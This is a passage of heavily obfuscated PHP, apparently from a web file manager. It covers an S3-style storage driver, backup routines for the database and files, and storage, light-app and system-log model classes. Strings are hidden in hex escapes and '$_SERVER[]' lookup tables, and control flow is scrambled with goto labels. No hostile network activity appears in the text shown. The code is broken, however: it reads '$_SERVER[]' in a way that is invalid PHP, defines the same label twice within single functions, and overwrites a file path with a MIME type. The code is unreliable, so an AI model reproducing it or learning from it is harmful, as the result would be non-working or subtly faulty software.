(isset($F[$a쟲[186]])) { if (!$BɎϋ && !$eͶ) { return !1; } $D++; } } } goto ḟܩ; ḟܩ: if ($BɎϋ) { return array($a쟲[191] => $B֫Č, $a쟲[192] => $D); } return !1; goto C匸; Fȿù: $a쟲 =& $_SERVER[]; $B֫Č = 0; $D = 0; goto b˩; C匸: } public function listAll($BÂ) { $D剦 =& $_SERVER[]; $d = $this->listObjs($BÂ); $B퍳 = $A޳Ḿ = array(); foreach ($d as $eє => $e﮴) { $B퍳[] = $e﮴[$D剦[28]]; $A޳Ḿ[$eє] = $e﮴[$D剦[77]]; } return $this->listAllFiles($BÂ, $B퍳, $A޳Ḿ); } public function canRead($c) { $A窦 =& $_SERVER[]; $Fӏ = $this->client->getAccessControlPolicy($this->bucket, $c); if (!$Fӏ) { return !1; } return in_array($Fӏ, array($A窦[193], $A窦[194], $A窦[195])) ? !0 : !1; } public function canWrite($AƮ) { $bӕ =& $_SERVER[]; $D = $this->client->getAccessControlPolicy($this->bucket, $AƮ); if (!$D) { return !1; } return in_array($D, array($bӕ[193], $bӕ[194])) ? !0 : !1; } public function getContent($a) { return $this->client->getObject($this->bucket, $a); } public function setContent($f, $CϺǔ = '', $dǷ = false) { goto f楄; f楄: $Cͳ =& $_SERVER[]; $f = $dǷ ? trim($f, $Cͳ[8]) . $Cͳ[8] : $f; $f = get_file_mime(get_path_ext($f)); goto dԌ; AӬ: $Bɡ = $this->copyFile($f, $f, array($Cͳ[196] => $Bɡ[$Cͳ[197]])); return $Bɡ ? !0 : !1; goto aɒ; dԌ: $Bɡ = $this->client->putObject($CϺǔ, $this->bucket, $f, $Cͳ[185], array(), $f); if (!$Bɡ) { return !1; } if ($dǷ) { return !0; } goto AӬ; aɒ: } public function fileSubstr($Cӓ͝, $Dҭ, $AǇᾺ) { $B = $Dҭ + $AǇᾺ - 1; return $this->client->getObject($this->bucket, $Cӓ͝, array($_SERVER[][198] => "\x62\x79\164\x65\x73\x3d{$Dҭ}\x2d{$B}")); } public function upload($b邙, $B綮, $b = false, $E = REPEAT_REPLACE) { $c =& $_SERVER[]; $Bͷ = array($c[196] => @md5_file($B綮)); $cѮ = array($c[199] => get_file_mime(get_path_ext($b邙))); if (IO::size($B綮) <= 1024 * 1024 * 200) { $EوƝ = $this->client->putObjectFile($B綮, $this->bucket, $b邙, $c[185], $Bͷ, $cѮ); return !empty($EوƝ) ? $this->getPathOuter($b邙) : !1; } $a = $this->client->multiUploadObject($B綮, $this->bucket, trim($b邙, $c[8]), $Bͷ, $cѮ); return $a ? $this->getPathOuter($b邙) : !1; } public function download($b, $c) { if (!@is_dir($this->pathFather($c)) && !IO::mkdir($this->pathFather($c))) { return !1; } $d΍˟ = $this->client->getObject($this->bucket, $b, array(), $c); return $d΍˟ !== !1 ? $c : !1; } public function link($a, $c = array()) { $eꚉ =& $_SERVER[]; if ($this->signVer == $eꚉ[200]) { return $this->client->getAuthenticatedURL($this->bucket, $a, 3600 * 12, $c); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($a, $eꚉ[8]), 3600 * 12, $this->region, array(), !0, $c); } public function fileOut($B, $aД = false, $D֪ = false, $a򑏯 = '') { goto E͓; E͓: $dө =& $_SERVER[]; if (!$D֪) { $D֪ = $this->pathThis($B); } $Aֵ = get_file_mime(get_path_ext($D֪)); goto Dȏ; Dȏ: if ($Aֵ == $dө[201]) { return parent::fileOut($B, $aД, $D֪, $a򑏯); } $aД = $aД ? $dө[202] : $dө[203]; $b٤ = array($dө[204] => $aД . $dө[205] . rawurlencode($D֪), $dө[206] => $Aֵ); goto f̉Ǯ; f̉Ǯ: $cԻ = $this->link($B, $b٤); $this->fileOutLink($cԻ); goto Aͪ; Aͪ: } public function fileOutServer($e, $Bڔ = false, $fѹ = false, $CđǾ = '') { parent::fileOut($e, $Bڔ, $fѹ, $CđǾ); } public function fileOutImage($c϶, $f = 250) { $Bͷ = $this->link($c϶); $this->fileOutLink($Bͷ); } public function fileOutImageServer($aն, $D΋ਲ = 250) { parent::fileOutImage($aն, $D΋ਲ); } public function hashMd5($bް, $c󇆝 = '') { $Aњ =& $_SERVER[]; $b֐ͣ = $this->objectMeta($bް); if (!$b֐ͣ) { return !1; } $c󇆝 = $c󇆝 ? $c󇆝 : _get($b֐ͣ, $Aњ[207]); $c󇆝 = $c󇆝 ? $c󇆝 : _get($b֐ͣ, $Aњ[197], $Aњ[33]); return $c󇆝; } public function uploadFormData($C, $B˼ = 3600) { $b򅳡 =& $_SERVER[]; $C͌⍡ = $this->pathFather($C); $f = $this->client->getHttpUploadPostParams($this->bucket, $C͌⍡, $b򅳡[185], $B˼); return array_merge((array) $f, array($b򅳡[169] => $this->getHost())); } public function multiUploadFormData($dΗ, $Dέ = 3600) { $cǏ =& $_SERVER[]; $Dʯ뱆 = gmdate($cǏ[208]); $a谎 = array(); $d醯 = $this->client->getUploadId($this->bucket, $dΗ, $a谎); if (!$d醯) { return !1; } return array($cǏ[209] => $d醯, $cǏ[169] => $this->getHost() . $cǏ[8] . $this->pathEncode($dΗ), $cǏ[210] => $Dʯ뱆, $cǏ[89] => $dΗ); } public function multiUploadAuthData($F, $Bȹ = array()) { goto E֕; b: if (strpos($Dɺ嚹, $EШ瓪[213]) === 0) { return array($EШ瓪[220] => $Bϰ, $EШ瓪[210] => $dɗ); } return $Bϰ; goto e; B: $Dܚ = $Bȹ[$EШ瓪[89]]; unset($Bȹ[$EШ瓪[89]]); if (isset($Bȹ[$EШ瓪[211]])) { $Bȹ[$EШ瓪[210]] = $dɗ; return $this->listUploadParts($Dܚ, $Bȹ); } goto dТ; eғ翾: $c = implode($EШ瓪[217], $Eפ); $B؛ʌ = base64_encode(hash_hmac($EШ瓪[218], $c, $this->secret, !0)); $Bϰ = $EШ瓪[219] . $this->accessKey . $EШ瓪[4] . $B؛ʌ; goto b; E֕: $EШ瓪 =& $_SERVER[]; $dɗ = isset($Bȹ[$EШ瓪[210]]) ? $Bȹ[$EШ瓪[210]] : gmdate($EШ瓪[208]); $Dɺ嚹 = isset($Bȹ[$EШ瓪[160]]) ? $Bȹ[$EШ瓪[160]] : $EШ瓪[33]; goto B; dТ: $Eפ = array($EШ瓪[212], $EШ瓪[33], $EШ瓪[116], $EШ瓪[33], "\x78\55\x61\x6d\172\x2d\x64\141\x74\x65\72{$dɗ}", $EШ瓪[8] . $this->bucket . $EШ瓪[8] . $this->pathEncode($Dܚ) . $Dɺ嚹); if (strpos($Dɺ嚹, $EШ瓪[213]) === 0) { $Eפ[0] = $EШ瓪[214]; } if (isset($Bȹ[$EШ瓪[215]]) && $Bȹ[$EШ瓪[215]] == $EШ瓪[216]) { $Eפ[0] = $EШ瓪[216]; } goto eғ翾; e: } public function listUploadParts($B凶, $cސ = array()) { goto aϩ; aϩ: $A =& $_SERVER[]; $aޟ = str_replace($A[221], $A[33], $cސ[$A[160]]); $DϞ = $this->client->listParts($this->bucket, $B凶, $aޟ); goto B½; Aŋ: $Eł = $this->multiUploadAuthData($B凶, $cސ); if (empty($Eł)) { return !1; } return array($A[220] => $Eł, $A[210] => $cސ[$A[210]], $A[222] => $DϞ); goto BԎ; B½: if (!$DϞ) { return !1; } unset($cސ[$A[211]], $cސ[$A[215]]); $cސ[$A[89]] = $B凶; goto Aŋ; BԎ: } public function getHost() { return parent::getHost() . $_SERVER[][8] . $this->bucket; } public function size($E𶈌) { $C־҆ = $this->objectMeta($E𶈌); return $C־҆ ? $C־҆[$_SERVER[][77]] : 0; } public function info($Cʤ) { if ($this->isFolder($Cʤ)) { return $this->folderInfo($Cʤ); } else { if ($this->isFile($Cʤ)) { return $this->fileInfo($Cʤ); } } return !1; } public function exist($BΥ) { return $this->isFile($BΥ) || $this->isFolder($BΥ); } public function isFile($Aל) { return !$this->isFolder($Aל) && $this->objectMeta($Aל); } public function isFolder($cʩ) { return $this->cacheMethod($_SERVER[][223], $cʩ); } protected function objectMeta($Eӄ) { return $this->cacheMethod($_SERVER[][224], $Eӄ); } protected function _objectMeta($eۊ) { $AόՆ =& $_SERVER[]; $eۊ = rtrim($eۊ, $AόՆ[8]); try { $Cŕӷ = $this->client->getObjectInfo($this->bucket, $eۊ); if (!isset($Cŕӷ[$AόՆ[207]]) && isset($Cŕӷ[$AόՆ[225]])) { $Cŕӷ[$AόՆ[207]] = $Cŕӷ[$AόՆ[225]]; } } catch (Exception $Fͫʙ) { $Cŕӷ = !1; } if (!$Cŕӷ) { } return $Cŕӷ; } protected function _isFolder($C椏) { goto E⯴; EֺÙ: if (substr($aȗ褚[0][$aн[28]], -1) == $aн[8]) { return !0; } if (get_path_this($aȗ褚[0][$aн[28]]) == get_path_this($C椏)) { return !1; } return !0; goto aݻ; E⯴: $aн =& $_SERVER[]; $C椏 = rtrim($C椏, $aн[8]); if ($C椏 == $aн[33] || $C椏 == $aн[8]) { return !0; } goto Bڻ; Bڻ: $aȗ褚 = $this->client->getBucket($this->bucket, $C椏, null, 1); if (empty($aȗ褚)) { return !1; } $aȗ褚 = array_values($aȗ褚); goto EֺÙ; aݻ: } } define($_SERVER[][226], 1); goto A씌ϛ; f੎: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto cӺ; cӺ: $bӭʲ =& $_SERVER[]; $b􏩺 = Backup::get(); self::$io = $b􏩺[$bӭʲ[710]]; goto F; b: mk_dir($c); $f͍ = $eʻᢲ = 0; $Aē = $dȍ->db()->getTables(); goto Dɒ; dɐ: Backup::set($F㎓); return !0; goto e; c: foreach ($Aē as $f) { $Aǒ = $c . $f . $bӭʲ[737]; $BƔܟ = null; if ($f == $bӭʲ[738] && (!isset($b􏩺[$bӭʲ[711]]) || $b􏩺[$bӭʲ[711]] == $bӭʲ[468])) { $BƔܟ = self::$io; } $eʻᢲ += $dȍ->sqlFromDb($f, $Aǒ, $CݕԠ, $BƔܟ); } $CݕԠ->end(); $F㎓ = array($bӭʲ[739] => $Fö, $bӭʲ[726] => 1, $bӭʲ[740] => $eʻᢲ, $bӭʲ[741] => $eʻᢲ); goto dɐ; Dɒ: $Aē = array_diff($Aē, array($bӭʲ[730], $bӭʲ[731])); foreach ($Aē as $f) { $f͍ += $dȍ->model($f)->count(); } $CݕԠ = new Task($bӭʲ[732], $bӭʲ[733], $f͍, LNG($bӭʲ[734]) . $bӭʲ[735] . LNG($bӭʲ[736])); goto c; F: self::$name = $b􏩺[$bӭʲ[28]]; $C಻ = $GLOBALS[$bӭʲ[6]][$bӭʲ[17]]; $Fö = $this->_dbType($C಻); goto e; e: $dȍ = new DbManage($C಻, $Fö); $c = TEMP_FILES . $bӭʲ[729] . self::$name . $bӭʲ[8]; del_dir($c); goto b; e: } private function _dbType($bڏ) { goto DС; cɸ: if ($BͿʂ == $Cߕڌ[743]) { $dᆈ = explode($Cߕڌ[4], $bڏ[$Cߕڌ[744]]); $BͿʂ = $dᆈ[0]; } $e⷇ = array($Cߕڌ[745] => $Cߕڌ[9], $Cߕڌ[746] => $Cߕڌ[747]); if (isset($e⷇[$BͿʂ])) { $BͿʂ = $e⷇[$BͿʂ]; } goto FÅʾ; DС: $Cߕڌ =& $_SERVER[]; $bڏ = array_change_key_case($bڏ); $BͿʂ = $bڏ[$Cߕڌ[742]]; goto cɸ; FÅʾ: return $BͿʂ; goto bֻݭ; bֻݭ: } } class BackupDbFile { public function __construct() { } public function index() { goto Dҍ; Dҍ: $E =& $_SERVER[]; $E = Backup::get(); $cɅή = $E[$E[28]]; goto D; D: $E = TEMP_FILES . "\142\x61\x63\x6b\x75\x70\x5f{$cɅή}\57"; $fĺ = "\x7b\x69\x6f\72{$E[$E[710]]}\x7d\57\x64\141\x74\x61\x62\x61\163\145\57"; IO::mkdir($fĺ . "\x62\141\x63\x6b\x75\160\x5f{$cɅή}\x2f"); goto F; cԑۗ: Backup::set(array($E[750] => $aѨν[$E[77]])); IO::move($E, $fĺ); $E쇹 = CONTROLLER_DIR . $E[751]; goto aҌ; dڎ: $C഍->end(); Backup::set(array($E[753] => $aѨν[$E[77]])); return !0; goto f; aҌ: $B = CONTROLLER_DIR . $E[752]; IO::copy($E쇹, $fĺ . "\x62\141\x63\x6b\x75\160\137{$cɅή}\57"); IO::copy($B, $fĺ . "\142\141\143\153\x75\160\x5f{$cɅή}\57"); goto dڎ; F: $C഍ = new TaskFileTransfer($E[748], $E[733], 0, LNG($E[734]) . $E[412] . LNG($E[736]) . $E[749]); $C഍->addPath($E); $aѨν = IO::infoWithChildren($E); goto cԑۗ; f: } } class BackupFile { public function __construct() { } public function index() { goto dď; dď: $dƐ = Backup::get(); $E˨ = $dƐ[$_SERVER[][281]][$_SERVER[][167]][$_SERVER[][419]]; $a = array($_SERVER[][420] => array($_SERVER[][754], $E˨), $_SERVER[][755] => array($_SERVER[][319], $dƐ[$_SERVER[][710]])); goto B׎; b: $F = $b  ? 1 : 0; $eǚ = array($_SERVER[][770] => 1, $_SERVER[][722] => time(), $_SERVER[][728] => $F, $_SERVER[][767] => $E˨, $_SERVER[][759] => $dҚ, $_SERVER[][758] => $fҘۚ); if ($D) { $eǚ[$_SERVER[][768]] = $cÒ; $eǚ[$_SERVER[][769]] = $a; } goto a; B׎: $fҘۚ = (int) Model($_SERVER[][738])->where($a)->count($_SERVER[][419]); $dҚ = (int) Model($_SERVER[][738])->where($a)->sum($_SERVER[][77]); $b׋ = new TaskFileTransfer($_SERVER[][756], $_SERVER[][733], $fҘۚ, LNG($_SERVER[][734]) . $_SERVER[][735] . LNG($_SERVER[][757])); goto Dԏ; d: $b  = !0; $F = $this->storeIds(); $E󑮕 = 1; goto cܗ; a: Backup::set($eǚ); $this->_fileFilter($f); return !0; goto Bӄ; cܗ: $e = 1000; $C̍ק = $D = 0; $f = array(); goto e; Dԏ: $b׋->task[$_SERVER[][717]] = $dҚ; $eǚ = array($_SERVER[][758] => $fҘۚ, $_SERVER[][759] => $dҚ); Backup::set($eǚ); goto d; e: $a = $cÒ = 0; do { $BѢΛ = $_SERVER[][760]; $d = Model($_SERVER[][738])->where($a)->field($BѢΛ)->order($_SERVER[][761])->selectPage($e, $E󑮕); $B˕뎃 = !empty($d[$_SERVER[][354]]) ? $d[$_SERVER[][354]] : array(); foreach ($B˕뎃 as $c腕) { goto B⤾; D޴: $C̍ק += $c腕[$_SERVER[][77]]; $cÒ += 1; $a += $c腕[$_SERVER[][77]]; goto Fз; Fз: if ($C̍ק >= 1024 * 1024 * 100) { $eǚ = array($_SERVER[][767] => $E˨, $_SERVER[][768] => $cÒ, $_SERVER[][769] => $a); Backup::set($eǚ); $C̍ק = $D = 0; } goto b; B⤾: if (!$this->_fileExist($c腕, $f, $F)) { $fҘۚ -= 1; $dҚ -= (int) $c腕[$_SERVER[][77]]; write_log("\146\x69\154\x65\x20\156\x6f\x74\40\145\170\x69\163\164\x2e\x66\x69\154\145\111\x44\x3a{$c腕[$_SERVER[][419]]}\x2c\x20\160\141\x74\x68\72{$c腕[$_SERVER[][75]]}", $_SERVER[][762]); continue; } $Dȍ = $c腕[$_SERVER[][75]]; $eԜ = "\x7b\151\157\72{$dƐ[$_SERVER[][710]]}\175" . substr($Dȍ, strlen("\x7b\151\157\72{$c腕[$_SERVER[][763]]}\175")); goto F҇; F҇: if (IO::exist($eԜ)) { $b׋->updateFileEnd($c腕[$_SERVER[][28]], $c腕[$_SERVER[][77]]); } else { $eԜ = get_path_father($eԜ); IO::mkdir($eԜ); if (!IO::copy($Dȍ, $eԜ, $_SERVER[][764])) { write_log($_SERVER[][765] . $Dȍ . $_SERVER[][766] . $eԜ . $_SERVER[][476], $_SERVER[][733]); $b  = !1; break; } } $E˨ = $c腕[$_SERVER[][419]]; $D += 1; goto D޴; b: } $a˓ = count($B˕뎃); $E󑮕++; } while ($a˓ == $e); $b׋->end(); goto b; Bӄ: } private function _fileExist($D̅, &$f, $aϏ) { goto E; Aه: $f = array_merge($f, array_to_keyvalue($Bɬ, $aѐ[33], $aѐ[419])); return !1; goto a֝̋; Dꥂ: if (!in_array($D̅[$aѐ[763]], $aϏ)) { return !1; } if (IO::exist($c敫)) { return !0; } $D = get_path_father($c敫); goto aޓ; E: $aѐ =& $_SERVER[]; $c敫 = $D̅[$aѐ[75]]; if (in_array($D̅[$aѐ[419]], $f)) { return !1; } goto Dꥂ; aޓ: if (IO::exist($D)) { $f[] = $D̅[$aѐ[419]]; return !1; } $C = array($aѐ[763] => $D̅[$aѐ[763]], $aѐ[75] => array($aѐ[771], "{$D}\x25")); $Bɬ = Model($aѐ[738])->where($C)->field($aѐ[420])->select(); goto Aه; a֝̋: } private function _fileFilter($F؈) { $e =& $_SERVER[]; if (empty($F؈)) { return; } $Fܷ = array($e[419] => array($e[7], array_unique($F؈))); $c睃 = Model($e[772])->where($Fܷ)->field($e[369])->select(); foreach ($c睃 as $A) { Model($e[772])->remove($A[$e[369]], !1); } } private function storeIds() { $D =& $_SERVER[]; $Dߟ = Model($D[723])->listData(); $cѓ = array(); $F = $GLOBALS[$D[6]][$D[84]][$D[773]]; foreach ($Dߟ as $a) { $fࠏ = strtolower($a[$D[90]]); if (!isset($F[$fࠏ])) { continue; } $Eá = $D[71] . (isset($F[$fࠏ]) ? $F[$fࠏ] : ucfirst($fࠏ)); if (!class_exists($Eá)) { continue; } $cѓ[] = $a[$D[367]]; } return $cѓ; } } goto A͌վ; dŪȪ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\163\x74\157\162\x61\147\x65\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\x69\172\x65\115\x61\170", "\163\171\163\164\x65\155", "\x64\145\x66\141\165\x6c\x74", "\144\x72\151\166\x65\x72", "\x63\x6f\x6e\146\151\147"); public function listData($E煘 = false, $BͯƏ = "\x6d\157\144\151\x66\171\124\151\155\x65", $b = false) { goto cظ; d: return $d믵殇; goto Cȕ; cظ: $F߬ =& $_SERVER[]; $d믵殇 = parent::listData($E煘, $BͯƏ, $b); if ($E煘) { return $d믵殇; } goto F; F: foreach ($d믵殇 as $eՋС => $fΐ) { unset($d믵殇[$eՋС][$F߬[6]]); $d믵殇[$eՋС][$F߬[2107]] = 0; } $B = array_to_keyvalue($d믵殇, $F߬[33], $F߬[367]); $this->_listAppendSize($d믵殇, $B); goto d; Cȕ: } public function _listAppendSize(&$e原, $dڌ) { $F =& $_SERVER[]; if (!$dڌ) { return; } $DՂܹʂ = $F[2385] . implode($F[47], $dڌ) . $F[2386]; $Cꏚ = Model($F[738])->query($DՂܹʂ); $Cꏚ = array_to_keyvalue($Cꏚ, $F[367], $F[77]); foreach ($e原 as $E => $c) { $e原[$E][$F[2107]] = isset($Cꏚ[$c[$F[367]]]) ? $Cꏚ[$c[$F[367]]] : 0; } } public function getConfig($aփ) { $aȸ = parent::listData($aփ); return json_decode($aȸ[$_SERVER[][6]], !0); } public function update($BԼҌ, $f) { goto dј; Dޑ: if (isset($e[$D]) && $e[$D][$C[367]] != $BԼҌ) { return !1; } if (isset($f[$C[2387]]) && $f[$C[2387]] == $C[83]) { $this->checkConfig($f); } unset($f[$C[2387]]); goto cʭ; cʭ: $F҉ = parent::update($BԼҌ, $f); if ($F҉ && $f[$C[34]]) { foreach ($e as $b΢ͻ) { if ($b΢ͻ[$C[34]] && $b΢ͻ[$C[367]] != $BԼҌ) { parent::update($b΢ͻ[$C[367]], array($C[34] => 0)); } } } return $F҉; goto e՜; dј: $C =& $_SERVER[]; $D = $f[$C[28]]; $e = array_to_keyvalue(parent::listData(), $C[28]); goto Dޑ; e՜: } public function add($dɬ) { goto e墯; bܑ: return $aܭƅ; goto F풌蘨; e墯: $c߮ =& $_SERVER[]; $Eߺ = array_to_keyvalue(parent::listData(), $c߮[28]); if (isset($Eߺ[$dɬ[$c߮[28]]])) { return !1; } goto d딅; d딅: $this->checkConfig($dɬ); $aܭƅ = parent::insert($dɬ); if ($aܭƅ && $dɬ[$c߮[34]]) { foreach ($Eߺ as $f舎鴕) { if ($f舎鴕[$c߮[34]]) { parent::update($f舎鴕[$c߮[367]], array($c߮[34] => 0)); } } } goto bܑ; F풌蘨: } public function checkConfig(&$f蚖) { goto c; Bն: $bق[$cߣ[1039]] = $BĘ; $f蚖[$cߣ[6]] = json_encode($bق); $f蚖[$cߣ[90]] = $Cݚ; goto E龠; c: $cߣ =& $_SERVER[]; $a᭣ = strtolower($f蚖[$cߣ[90]]); $bق = json_decode($f蚖[$cߣ[6]], !0); goto e; e: foreach ($bق as $A => $C) { $bق[$A] = trim($C); } $bق[$cߣ[2388]] = rand_string(6); $Cݚ = $this->driverType($a᭣); goto eɦ; fۃ: $BĘ = rtrim($bق[$cߣ[1039]], $cߣ[8]) . $cߣ[8]; $f = $a->getPath($BĘ . $cߣ[2002]); if (!$a->mkfile($f)) { show_json(LNG($cߣ[2389]), !1); } goto Bն; E龠: return !0; goto Fǚ; eɦ: $AҒ = $cߣ[71] . $Cݚ; $a = new $AҒ($bق); if (in_array($a᭣, $a->objectDriver)) { if (!$a->isBucketCors() && !$a->setBucketCors()) { $d = LNG($cߣ[2389]); $d .= $cߣ[2390] . LNG($cߣ[2391]); show_json($d, !1); } } goto fۃ; Fǚ: } private function driverType($D) { $A =& $_SERVER[]; $D새 = array($A[102] => $A[2392], $A[58] => $A[2393], $A[64] => $A[2394]); if (isset($D새[$D])) { return $D새[$D]; } return strtoupper($D); } public function driverListSystem() { $B =& $_SERVER[]; $c = parent::listData(); $aҪ´ = array(); foreach ($c as $E熈) { unset($E熈[$B[187]], $E熈[$B[107]]); $E熈[$B[6]] = json_decode($E熈[$B[6]], !0); $aҪ´[] = $E熈; } return $aҪ´; } public function defaultDriver() { $a狏 =& $_SERVER[]; $Cϋ = parent::listData(); $Cڏ = array_filter_by_field($Cϋ, $a狏[34], 1); $Cڏ = $Cڏ[0]; if ($Cڏ) { $Cڏ[$a狏[6]] = json_decode($Cڏ[$a狏[6]], !0); } return $Cڏ; } public function driverInfo($d) { $cՋ繖о =& $_SERVER[]; $F = array_to_keyvalue(parent::listData(), $cՋ繖о[367]); if (!isset($F[$d])) { return !1; } $dژ = $F[$d]; $dژ[$cՋ繖о[6]] = json_decode($dژ[$cՋ繖о[6]], !0); return $dژ; } public function remove($Fƛ慽) { $this->removeShareItems($Fƛ慽); return parent::remove($Fƛ慽); } public function removeWithFile($f܄) { goto e; e星: $fα = Model($FĶ[167])->where($C)->field($FĶ[2398])->select(); foreach ($fα as $c) { goto Dжꙑ; fͣ: if (IO::exist($A͆)) { $Ā->updateFileEnd($c[$FĶ[28]], $c[$FĶ[77]]); continue; } if (!IO::move($f䎏, get_path_father($A͆))) { $cÅ = !1; break; } $C = array($FĶ[419] => $c[$FĶ[419]]); goto E潄; E潄: $c܎ = array($FĶ[763] => $AΣ, $FĶ[75] => $A͆); Model($FĶ[167])->where($C)->save($c܎); goto B; Dжꙑ: $f䎏 = $c[$FĶ[75]]; $A͆ = $AàŘ . str_replace("\x7b\x69\157\72{$f܄}\175\57", $FĶ[33], $f䎏); if (!IO::exist($f䎏)) { $f[] = $c[$FĶ[419]]; $Ā->updateFileEnd($c[$FĶ[28]], $c[$FĶ[77]]); continue; } goto fͣ; B: } $this->removeByFileID($f); goto Eī; e: $FĶ =& $_SERVER[]; $C = array($FĶ[763] => $f܄); $bҌ = Model($FĶ[422])->where($C)->count(); goto e; e: $a = Model($FĶ[422])->where($C)->sum($FĶ[77]); $e = $FĶ[2395] . $f܄; $Ā = new TaskFileTransfer($e, $FĶ[2396], $bҌ, LNG($FĶ[2397]) . "\50{$f܄}\51"); goto a׋; F: $AàŘ = "\173\x69\x6f\x3a{$AΣ}\x7d\57"; $cÅ = !0; $f = array(); goto e星; a׋: $Ā->task[$FĶ[717]] = (double) $a; $b = KodIO::defaultDriver(); $AΣ = $b[$FĶ[367]]; goto F; Eī: if (!$cÅ) { $Ā->stop($e); return !1; } $Ā->end(); $this->remove($f܄); goto Dɻ; Dɻ: } public function progress($Dېθ) { return Task::get($_SERVER[][2395] . $Dېθ); } private function removeByFileID($a؆ = array()) { goto Fֳ; c: $E숬 = Model($Cô[1133])->where($b쐦)->field($Cô[369])->select(); if (!$E숬) { return; } $E숬 = array_to_keyvalue($E숬, $Cô[33], $Cô[369]); goto Fؕ; Fؕ: foreach ($E숬 as $D) { Model($Cô[382])->removeNow($D, !1); } goto aͻ; Fֳ: $Cô =& $_SERVER[]; if (empty($a؆)) { return; } $b쐦 = array($Cô[419] => array($Cô[7], $a؆)); goto c; aͻ: } private function removeShareItems($A݋) { goto B٥; B٥: $eף =& $_SERVER[]; $DԎ = "\173\151\157\72{$A݋}\175\x2f"; $aĻǃ = array($eף[369] => 0, $eף[1034] => array($eף[771], "{$DԎ}\45")); goto bކ; bކ: $Eُ獞 = Model($eף[2098])->where($aĻǃ)->field($eף[441])->select(); if (empty($Eُ獞)) { return; } $D񇂂 = array_to_keyvalue($Eُ獞, $eף[33], $eף[441]); goto f̏Γ; f̏Γ: Model($eף[536])->remove($D񇂂); goto cᚢ; cᚢ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\114\x69\147\x68\164\x41\x70\x70"; public $modelType = "\x53\x79\163\x74\x65\155\x4f\x70\164\x69\x6f\156"; public $field = array("\156\141\155\145", "\x67\162\157\x75\x70", "\x64\x65\x73\143", "\143\x6f\x6e\x74\x65\x6e\164"); public function listData($d߄ = false, $cð̣ = "\155\x6f\144\x69\146\171\x54\151\155\x65", $a׻ = true) { return parent::listData($d߄, $cð̣, $a׻); } public function remove($f̦޸) { $d͏ = $this->findByName($f̦޸); if (!$d͏) { return !1; } return parent::remove($d͏[$_SERVER[][367]]); } public function add($D깠،) { if ($this->findByName($D깠،[$_SERVER[][28]])) { return !1; } return parent::insert($D깠،); } public function update($dո, $eㄑб) { $FشͰ =& $_SERVER[]; $eԖ = $this->findByName($dո); $A = $this->findByName($eㄑб[$FشͰ[28]]); if (!$eԖ || $A && $A[$FشͰ[367]] != $eԖ[$FشͰ[367]]) { return !1; } return parent::update($eԖ[$FشͰ[367]], $eㄑб); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\x69\155\x65", "\164\x69\155\145", "\151\156\x73\x65\162\x74", "\146\x75\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $f̑ϱ =& $_SERVER[]; return array($f̑ϱ[2399] => LNG($f̑ϱ[2400]), $f̑ϱ[2401] => LNG($f̑ϱ[2402]), $f̑ϱ[2060] => LNG($f̑ϱ[2403]), $f̑ϱ[2404] => LNG($f̑ϱ[2405]), $f̑ϱ[2406] => LNG($f̑ϱ[2407]), $f̑ϱ[2408] => LNG($f̑ϱ[2409]), $f̑ϱ[2410] => LNG($f̑ϱ[2411]), $f̑ϱ[2412] => LNG($f̑ϱ[2413]), $f̑ϱ[2091] => LNG($f̑ϱ[2414]), $f̑ϱ[2092] => LNG($f̑ϱ[2415]), $f̑ϱ[2416] => LNG($f̑ϱ[2417]), $f̑ϱ[2418] => LNG($f̑ϱ[2419]), $f̑ϱ[2420] => LNG($f̑ϱ[2421]), $f̑ϱ[2422] => LNG($f̑ϱ[2423]), $f̑ϱ[2089] => LNG($f̑ϱ[2424]), $f̑ϱ[2096] => LNG($f̑ϱ[2425]), $f̑ϱ[2426] => LNG($f̑ϱ[2427]), $f̑ϱ[2428] => LNG($f̑ϱ[2429]), $f̑ϱ[2430] => LNG($f̑ϱ[2431]), $f̑ϱ[2432] => LNG($f̑ϱ[2433]), $f̑ϱ[2099] => LNG($f̑ϱ[2434]), $f̑ϱ[2100] => LNG($f̑ϱ[2435]), $f̑ϱ[2436] => LNG($f̑ϱ[2437]), $f̑ϱ[2438] => LNG($f̑ϱ[2439]), $f̑ϱ[2440] => LNG($f̑ϱ[2441]), $f̑ϱ[2094] => LNG($f̑ϱ[2442]), $f̑ϱ[2443] => LNG($f̑ϱ[2444]), $f̑ϱ[2093] => LNG($f̑ϱ[2445]), $f̑ϱ[2446] => LNG($f̑ϱ[2447]), $f̑ϱ[2448] => LNG($f̑ϱ[2449]), $f̑ϱ[2450] => LNG($f̑ϱ[2450]), $f̑ϱ[2451] => LNG($f̑ϱ[2064]), $f̑ϱ[2452] => LNG($f̑ϱ[2453]), $f̑ϱ[2454] => LNG($f̑ϱ[2455]), $f̑ϱ[2456] => LNG($f̑ϱ[2457]), $f̑ϱ[2458] => LNG($f̑ϱ[2459]), $f̑ϱ[2460] => LNG($f̑ϱ[2461]), $f̑ϱ[2462] => LNG($f̑ϱ[2462]), $f̑ϱ[2463] => LNG($f̑ϱ[2464]), $f̑ϱ[2465] => LNG($f̑ϱ[2466]), $f̑ϱ[2467] => LNG($f̑ϱ[2468]), $f̑ϱ[2469] => LNG($f̑ϱ[2470]), $f̑ϱ[2471] => LNG($f̑ϱ[2472]), $f̑ϱ[2473] => LNG($f̑ϱ[2474])); } private function typeFile() { $Bϼ =& $_SERVER[]; $CѾڷ = array($Bϼ[2096] => array($Bϼ[2097]), $Bϼ[2420] => array($Bϼ[2475]), $Bϼ[2422] => array($Bϼ[2476]), $Bϼ[2089] => array($Bϼ[2090]), $Bϼ[2428] => array(), $Bϼ[2430] => array(), $Bϼ[2432] => array(), $Bϼ[2099] => array($Bϼ[2101]), $Bϼ[2100] => array($Bϼ[2101]), $Bϼ[2436] => array($Bϼ[2477]), $Bϼ[2438] => array($Bϼ[2477]), $Bϼ[2440] => array($Bϼ[2478]), $Bϼ[2426] => array($Bϼ[2479]), $Bϼ[2094] => array($Bϼ[2480]), $Bϼ[2443] => array($Bϼ[2481]), $Bϼ[2093] => 